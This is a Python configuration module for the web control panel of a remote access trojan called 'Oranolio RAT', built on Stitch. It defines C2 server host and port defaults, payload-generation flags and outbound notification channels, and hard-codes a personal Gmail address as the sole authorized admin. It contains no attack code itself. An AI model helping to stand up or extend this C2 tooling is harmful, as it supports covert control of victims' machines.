#!/usr/bin/env python3
"""
Stitch RAT Web Interface - Configuration Module
Centralized configuration with environment variable support and defaults
"""
import os
import secrets
import json
from pathlib import Path
from datetime import timedelta

class Config:
    """Configuration class for Stitch Web Interface"""
    
    # ============================================================================
    # Core Application Settings
    # ============================================================================
    APP_NAME = "Oranolio RAT"
    APP_VERSION = "1.1.0"
    
    # Base directories
    BASE_DIR = Path(__file__).parent
    APPLICATION_DIR = BASE_DIR / "Application"
    LOGS_DIR = BASE_DIR / "Logs"
    TEMP_DIR = BASE_DIR / "Temp"
    UPLOADS_DIR = BASE_DIR / "Uploads"
    DOWNLOADS_DIR = BASE_DIR / "Downloads"
    
    # Server Configuration
    HOST = os.getenv('STITCH_HOST', '0.0.0.0')
    PORT = int(os.getenv('STITCH_PORT', '5000'))
    DEBUG = os.getenv('STITCH_DEBUG', 'false').lower() in ('true', '1', 'yes')
    STITCH_SERVER_PORT = int(os.getenv('STITCH_SERVER_PORT', '4040'))
    
    # C2 Server Configuration
    c2_host = os.getenv('C2_HOST', '0.0.0.0')
    c2_port = int(os.getenv('C2_PORT', '4447'))
    
    # ============================================================================
    # Email Configuration (Multiple Free Methods)
    # ============================================================================
    
    # Primary email settings
    FROM_EMAIL = os.getenv('FROM_EMAIL', 'brooketogo98@gmail.com')
    FROM_NAME = os.getenv('FROM_NAME', 'Oranolio Security')
    
    # Automated Email Methods (zero configuration)
    USE_AUTOMATED_EMAIL = os.getenv('USE_AUTOMATED_EMAIL', 'true').lower() in ('true', '1', 'yes')
    USE_FREE_EMAIL = os.getenv('USE_FREE_EMAIL', 'false').lower() in ('true', '1', 'yes')

    # Gmail SMTP (Free) - Requires App Password
    GMAIL_APP_PASSWORD = os.getenv('GMAIL_APP_PASSWORD', '')

    # Outlook SMTP (Free)
    OUTLOOK_PASSWORD = os.getenv('OUTLOOK_PASSWORD', '')

    # Telegram Bot (Free)
    TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

    # Discord Webhook (Free)
    DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')

    # Webhook.site (Free)
    WEBHOOK_SITE_URL = os.getenv('WEBHOOK_SITE_URL', '')

    # Legacy Mailjet (Paid) - Fallback
    MAILJET_API_KEY = os.getenv('MAILJET_API_KEY', '')
    MAILJET_API_SECRET = os.getenv('MAILJET_API_SECRET', '')

    # Authorized emails for elite access (comma-separated)
    AUTHORIZED_EMAILS = os.getenv('STITCH_AUTHORIZED_EMAILS', 'brooketogo98@gmail.com').split(',') if os.getenv('STITCH_AUTHORIZED_EMAILS') else ['brooketogo98@gmail.com']
    
    # ============================================================================
    # Security Configuration
    # ============================================================================

    # Session Secret Key Management
    SECRET_KEY_FILE = APPLICATION_DIR / '.secret_key'
    
    @classmethod
    def ensure_secret_key(cls):
        """Ensure a persistent secret key exists"""
        # First check environment variable
        secret_key = os.getenv('STITCH_SECRET_KEY')
        if secret_key:
            return secret_key
        
        # Check for existing secret key file
        if cls.SECRET_KEY_FILE.exists():
            try:
                with open(cls.SECRET_KEY_FILE, 'r') as f:
                    secret_key = f.read().strip()
                    if secret_key:
                        return secret_key
            except Exception as e:
                print(f"⚠️  Warning: Could not read secret key file: {e}")
        
        # Generate new persistent secret key
        secret_key = secrets.token_hex(32)
        try:
            # Ensure Application directory exists
            cls.APPLICATION_DIR.mkdir(parents=True, exist_ok=True)
            
            # Save to file with restricted permissions
            with open(cls.SECRET_KEY_FILE, 'w') as f:
                f.write(secret_key)
            
            # Set file permissions (Unix/Linux only)
            try:
                os.chmod(cls.SECRET_KEY_FILE, 0o600)
            except Exception:
                pass  # Windows doesn't support chmod
            
            print(f"✓ Generated persistent secret key: {cls.SECRET_KEY_FILE}")
            print("  Sessions will persist across server restarts")
        except Exception as e:
            print(f"⚠️  Could not save secret key to file: {e}")
            print("  Sessions will be lost on server restart")
        
        return secret_key

    # Get persistent secret key (will be set after class definition)
    SECRET_KEY = None
    
    # Session Configuration
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    SESSION_TIMEOUT_MINUTES = int(os.getenv('STITCH_SESSION_TIMEOUT', '30'))
    SESSION_COOKIE_SECURE = os.getenv('STITCH_HTTPS', 'false').lower() in ('true', '1', 'yes')
    PERMANENT_SESSION_LIFETIME = timedelta(minutes=SESSION_TIMEOUT_MINUTES)
    
    # HTTPS Configuration
    ENABLE_HTTPS = os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes')
    SSL_CERT_PATH = os.getenv('STITCH_SSL_CERT', '')
    SSL_KEY_PATH = os.getenv('STITCH_SSL_KEY', '')
    
    # ============================================================================
    # Authentication & Authorization
    # ============================================================================
    
    # Legacy admin credentials removed - using webhook-based authentication
    # Authentication is now handled by webhook_auth_manager.py and mfa_manager.py
    
    # Password requirements
    MIN_PASSWORD_LENGTH = int(os.getenv('STITCH_MIN_PASSWORD_LENGTH', '12'))
    REQUIRE_SPECIAL_CHARS = os.getenv('STITCH_REQUIRE_SPECIAL_CHARS', 'true').lower() in ('true', '1', 'yes')
    REQUIRE_NUMBERS = os.getenv('STITCH_REQUIRE_NUMBERS', 'true').lower() in ('true', '1', 'yes')
    REQUIRE_UPPERCASE = os.getenv('STITCH_REQUIRE_UPPERCASE', 'true').lower() in ('true', '1', 'yes')
    
    # ============================================================================
    # API Configuration
    # ============================================================================
    
    # API Keys
    ENABLE_API_KEYS = os.getenv('STITCH_ENABLE_API_KEYS', 'true').lower() in ('true', '1', 'yes')
    API_KEY_LENGTH = 32
    API_KEY_EXPIRY_DAYS = int(os.getenv('STITCH_API_KEY_EXPIRY', '365'))
    API_KEYS_FILE = APPLICATION_DIR / 'api_keys.json'
    
    # Rate Limiting
    MAX_LOGIN_ATTEMPTS = int(os.getenv('STITCH_MAX_LOGIN_ATTEMPTS', '5'))
    LOGIN_LOCKOUT_MINUTES = int(os.getenv('STITCH_LOGIN_LOCKOUT_MINUTES', '15'))
    COMMANDS_PER_MINUTE = int(os.getenv('STITCH_COMMANDS_PER_MINUTE', '60'))
    EXECUTIONS_PER_MINUTE = int(os.getenv('STITCH_EXECUTIONS_PER_MINUTE', '30'))
    API_POLLING_PER_HOUR = int(os.getenv('STITCH_API_POLLING_PER_HOUR', '1000'))
    DEFAULT_RATE_LIMIT_DAY = int(os.getenv('STITCH_RATE_LIMIT_DAY', '10000'))
    DEFAULT_RATE_LIMIT_HOUR = int(os.getenv('STITCH_RATE_LIMIT_HOUR', '1000'))
    
    # ============================================================================
    # WebSocket Configuration
    # ============================================================================
    
    WEBSOCKET_PING_TIMEOUT = int(os.getenv('STITCH_WEBSOCKET_PING_TIMEOUT', '60'))
    WEBSOCKET_PING_INTERVAL = int(os.getenv('STITCH_WEBSOCKET_PING_INTERVAL', '25'))
    WEBSOCKET_MAX_CONNECTIONS = int(os.getenv('STITCH_WEBSOCKET_MAX_CONNECTIONS', '1000'))
    
    # ============================================================================
    # Security Headers
    # ============================================================================
    
    # Content Security Policy
    CSP_ENABLED = os.getenv('STITCH_CSP_ENABLED', 'false').lower() in ('true', '1', 'yes')
    CSP_REPORT_ONLY = os.getenv('STITCH_CSP_REPORT_ONLY', 'false').lower() in ('true', '1', 'yes')
    CSP_DEFAULT_SRC = "'self'"
    CSP_SCRIPT_SRC = "'self' 'unsafe-inline' 'unsafe-eval'"
    CSP_STYLE_SRC = "'self' 'unsafe-inline'"
    CSP_IMG_SRC = "'self' data: https:"
    CSP_FONT_SRC = "'self' data:"
    CSP_CONNECT_SRC = "'self' ws: wss:"
    
    # CORS Configuration
    CORS_ORIGINS = os.getenv('STITCH_CORS_ORIGINS', '*').split(',')
    CORS_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
    CORS_HEADERS = ['Content-Type', 'Authorization', 'X-Requested-With']
    
    # ============================================================================
    # Logging Configuration
    # ============================================================================
    
    LOG_LEVEL = os.getenv('STITCH_LOG_LEVEL', 'INFO')
    LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    LOG_DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
    ENABLE_FILE_LOGGING = os.getenv('STITCH_ENABLE_FILE_LOGGING', 'true').lower() in ('true', '1', 'yes')
    ENABLE_SYSLOG = os.getenv('STITCH_ENABLE_SYSLOG', 'false').lower() in ('true', '1', 'yes')
    LOG_FILE = LOGS_DIR / 'stitch_web.log'
    MAX_LOG_SIZE = int(os.getenv('STITCH_MAX_LOG_SIZE', '10485760'))  # 10MB
    LOG_MAX_BYTES = MAX_LOG_SIZE
    LOG_BACKUP_COUNT = int(os.getenv('STITCH_LOG_BACKUP_COUNT', '5'))
    
    # History and Logs
    MAX_DEBUG_LOGS = int(os.getenv('STITCH_MAX_DEBUG_LOGS', '1000'))
    MAX_COMMAND_HISTORY = int(os.getenv('STITCH_MAX_COMMAND_HISTORY', '1000'))
    DEFAULT_LOG_FETCH_LIMIT = int(os.getenv('STITCH_LOG_FETCH_LIMIT', '100'))
    DEFAULT_HISTORY_FETCH_LIMIT = int(os.getenv('STITCH_HISTORY_FETCH_LIMIT', '100'))
    
    # ============================================================================
    # Database Configuration
    # ============================================================================
    
    DATABASE_URL = os.getenv('STITCH_DATABASE_URL', f'sqlite:///{APPLICATION_DIR}/stitch.db')
    DATABASE_POOL_SIZE = int(os.getenv('STITCH_DATABASE_POOL_SIZE', '10'))
    DATABASE_POOL_TIMEOUT = int(os.getenv('STITCH_DATABASE_POOL_TIMEOUT', '30'))
    DATABASE_POOL_RECYCLE = int(os.getenv('STITCH_DATABASE_POOL_RECYCLE', '3600'))
    
    # ============================================================================
    # Connection Limits
    # ============================================================================
    
    MAX_CONNECTIONS = int(os.getenv('STITCH_MAX_CONNECTIONS', '1000'))
    MAX_CONNECTIONS_PER_IP = int(os.getenv('STITCH_MAX_CONNECTIONS_PER_IP', '10'))
    CONNECTION_TIMEOUT = int(os.getenv('STITCH_CONNECTION_TIMEOUT', '300'))
    STALE_CONNECTION_THRESHOLD = int(os.getenv('STITCH_STALE_CONNECTION_THRESHOLD', '3600'))  # 1 hour
    
    # ============================================================================
    # UI/UX Configuration
    # ============================================================================
    
    PAGINATION_DEFAULT = int(os.getenv('STITCH_PAGINATION_DEFAULT', '25'))
    PAGINATION_MAX = int(os.getenv('STITCH_PAGINATION_MAX', '100'))
    AUTO_REFRESH_INTERVAL = int(os.getenv('STITCH_AUTO_REFRESH_INTERVAL', '5'))
    THEME = os.getenv('STITCH_THEME', 'dark')
    
    # ============================================================================
    # Development Configuration
    # ============================================================================
    
    DEVELOPMENT_MODE = os.getenv('STITCH_DEVELOPMENT', 'false').lower() in ('true', '1', 'yes')
    ENABLE_DEBUG_TOOLBAR = os.getenv('STITCH_DEBUG_TOOLBAR', 'false').lower() in ('true', '1', 'yes')
    ENABLE_PROFILER = os.getenv('STITCH_PROFILER', 'false').lower() in ('true', '1', 'yes')
    
    # ============================================================================
    # Performance Configuration
    # ============================================================================
    
    ENABLE_CACHING = os.getenv('STITCH_ENABLE_CACHING', 'true').lower() in ('true', '1', 'yes')
    CACHE_TYPE = os.getenv('STITCH_CACHE_TYPE', 'simple')
    CACHE_DEFAULT_TIMEOUT = int(os.getenv('STITCH_CACHE_TIMEOUT', '300'))
    
    # ============================================================================
    # Monitoring Configuration
    # ============================================================================
    
    ENABLE_METRICS = os.getenv('STITCH_ENABLE_METRICS', 'true').lower() in ('true', '1', 'yes')
    METRICS_INTERVAL = int(os.getenv('STITCH_METRICS_INTERVAL', '60'))
    ENABLE_HEALTH_CHECKS = os.getenv('STITCH_ENABLE_HEALTH_CHECKS', 'true').lower() in ('true', '1', 'yes')
    
    # ============================================================================
    # Backup Configuration
    # ============================================================================
    
    ENABLE_AUTO_BACKUP = os.getenv('STITCH_ENABLE_AUTO_BACKUP', 'true').lower() in ('true', '1', 'yes')
    ENABLE_BACKUP_RESTORE = os.getenv('STITCH_ENABLE_BACKUP_RESTORE', 'true').lower() in ('true', '1', 'yes')
    BACKUP_INTERVAL_HOURS = int(os.getenv('STITCH_BACKUP_INTERVAL_HOURS', '24'))
    BACKUP_RETENTION_DAYS = int(os.getenv('STITCH_BACKUP_RETENTION_DAYS', '30'))
    BACKUP_DIR = BASE_DIR / 'backups'
    
    # ============================================================================
    # Security Features
    # ============================================================================
    
    ENABLE_CSRF_PROTECTION = os.getenv('STITCH_ENABLE_CSRF', 'true').lower() in ('true', '1', 'yes')
    ENABLE_XSS_PROTECTION = os.getenv('STITCH_ENABLE_XSS', 'true').lower() in ('true', '1', 'yes')
    ENABLE_SQL_INJECTION_PROTECTION = os.getenv('STITCH_ENABLE_SQL_PROTECTION', 'true').lower() in ('true', '1', 'yes')
    ENABLE_INPUT_VALIDATION = os.getenv('STITCH_ENABLE_INPUT_VALIDATION', 'true').lower() in ('true', '1', 'yes')
    WTF_CSRF_SSL_STRICT = os.getenv('STITCH_WTF_CSRF_SSL_STRICT', 'false').lower() in ('true', '1', 'yes')
    
    # ============================================================================
    # File Upload Configuration
    # ============================================================================
    
    MAX_UPLOAD_SIZE = int(os.getenv('STITCH_MAX_UPLOAD_SIZE', '104857600'))  # 100MB
    ALLOWED_EXTENSIONS = os.getenv('STITCH_ALLOWED_EXTENSIONS', 'txt,py,js,html,css,json,xml,log').split(',')
    UPLOAD_FOLDER = UPLOADS_DIR
    DOWNLOAD_FOLDER = DOWNLOADS_DIR
    
    # ============================================================================
    # Email Verification Configuration
    # ============================================================================
    
    EMAIL_VERIFICATION_TIMEOUT = int(os.getenv('STITCH_EMAIL_VERIFICATION_TIMEOUT', '600'))  # 10 minutes
    EMAIL_VERIFICATION_ATTEMPTS = int(os.getenv('STITCH_EMAIL_VERIFICATION_ATTEMPTS', '5'))
    EMAIL_RATE_LIMIT_HOURS = int(os.getenv('STITCH_EMAIL_RATE_LIMIT_HOURS', '1'))
    EMAIL_RATE_LIMIT_COUNT = int(os.getenv('STITCH_EMAIL_RATE_LIMIT_COUNT', '3'))
    
    # ============================================================================
    # MFA Configuration
    # ============================================================================
    
    MFA_ISSUER_NAME = os.getenv('STITCH_MFA_ISSUER', 'Oranolio RAT')
    MFA_BACKUP_CODES_COUNT = int(os.getenv('STITCH_MFA_BACKUP_CODES', '10'))
    MFA_WINDOW_SIZE = int(os.getenv('STITCH_MFA_WINDOW_SIZE', '1'))
    
    # ============================================================================
    # Session Security
    # ============================================================================
    
    SESSION_ANOMALY_DETECTION = os.getenv('STITCH_SESSION_ANOMALY_DETECTION', 'true').lower() in ('true', '1', 'yes')
    SESSION_DEVICE_FINGERPRINTING = os.getenv('STITCH_SESSION_DEVICE_FINGERPRINTING', 'true').lower() in ('true', '1', 'yes')
    SESSION_REGENERATION_INTERVAL = int(os.getenv('STITCH_SESSION_REGENERATION_INTERVAL', '1800'))  # 30 minutes
    
    # ============================================================================
    # Cryptographic Configuration
    # ============================================================================
    
    CRYPTO_ALGORITHM = os.getenv('STITCH_CRYPTO_ALGORITHM', 'AES-256-GCM')
    CRYPTO_KEY_ROTATION_DAYS = int(os.getenv('STITCH_CRYPTO_KEY_ROTATION_DAYS', '30'))
    CRYPTO_KEY_DERIVATION_ITERATIONS = int(os.getenv('STITCH_CRYPTO_KEY_DERIVATION_ITERATIONS', '100000'))
    
    # ============================================================================
    # Error Handling
    # ============================================================================
    
    ENABLE_ERROR_EMAILS = os.getenv('STITCH_ENABLE_ERROR_EMAILS', 'false').lower() in ('true', '1', 'yes')
    ERROR_EMAIL_RECIPIENTS = os.getenv('STITCH_ERROR_EMAIL_RECIPIENTS', '').split(',')
    ERROR_LOG_LEVEL = os.getenv('STITCH_ERROR_LOG_LEVEL', 'ERROR')
    
    # ============================================================================
    # Feature Flags
    # ============================================================================
    
    ENABLE_ELITE_COMMANDS = os.getenv('STITCH_ENABLE_ELITE_COMMANDS', 'true').lower() in ('true', '1', 'yes')
    ENABLE_PAYLOAD_GENERATION = os.getenv('STITCH_ENABLE_PAYLOAD_GENERATION', 'true').lower() in ('true', '1', 'yes')
    ENABLE_REAL_TIME_MONITORING = os.getenv('STITCH_ENABLE_REAL_TIME_MONITORING', 'true').lower() in ('true', '1', 'yes')
    ENABLE_ADVANCED_SECURITY = os.getenv('STITCH_ENABLE_ADVANCED_SECURITY', 'true').lower() in ('true', '1', 'yes')
    
    # ============================================================================
    # Utility Methods
    # ============================================================================
    
    @classmethod
    def get_authorized_emails(cls):
        """Get list of authorized emails"""
        if cls.AUTHORIZED_EMAILS:
            return [email.strip() for email in cls.AUTHORIZED_EMAILS if email.strip()]
        return ['brooketogo98@gmail.com']  # Default fallback
    
    @classmethod
    def is_email_authorized(cls, email):
        """Check if email is authorized"""
        return email in cls.get_authorized_emails()
    
    @classmethod
    def get_database_url(cls):
        """Get database URL"""
        return cls.DATABASE_URL
    
    @classmethod
    def get_secret_key(cls):
        """Get secret key"""
        return cls.SECRET_KEY
    
    @classmethod
    def is_development_mode(cls):
        """Check if in development mode"""
        return cls.DEVELOPMENT_MODE or cls.DEBUG
    
    @classmethod
    def get_upload_folder(cls):
        """Get upload folder path"""
        cls.UPLOADS_DIR.mkdir(parents=True, exist_ok=True)
        return str(cls.UPLOADS_DIR)
    
    @classmethod
    def get_download_folder(cls):
        """Get download folder path"""
        cls.DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
        return str(cls.DOWNLOADS_DIR)
    
    @classmethod
    def get_logs_folder(cls):
        """Get logs folder path"""
        cls.LOGS_DIR.mkdir(parents=True, exist_ok=True)
        return str(cls.LOGS_DIR)
    
    @classmethod
    def get_backup_folder(cls):
        """Get backup folder path"""
        cls.BACKUP_DIR.mkdir(parents=True, exist_ok=True)
        return str(cls.BACKUP_DIR)
    
    @classmethod
    def get_csp_policy(cls, nonce=None):
        """Get Content Security Policy string"""
        if not cls.CSP_ENABLED:
            return None
        
        policy_parts = [
            f"default-src {cls.CSP_DEFAULT_SRC}",
            f"script-src {cls.CSP_SCRIPT_SRC}",
            f"style-src {cls.CSP_STYLE_SRC}",
            f"img-src {cls.CSP_IMG_SRC}",
            f"font-src {cls.CSP_FONT_SRC}",
            f"connect-src {cls.CSP_CONNECT_SRC}"
        ]
        
        if nonce:
            policy_parts.append(f"script-src 'nonce-{nonce}'")
        
        return "; ".join(policy_parts)

# Initialize the secret key after class definition
Config.SECRET_KEY = Config.ensure_secret_key()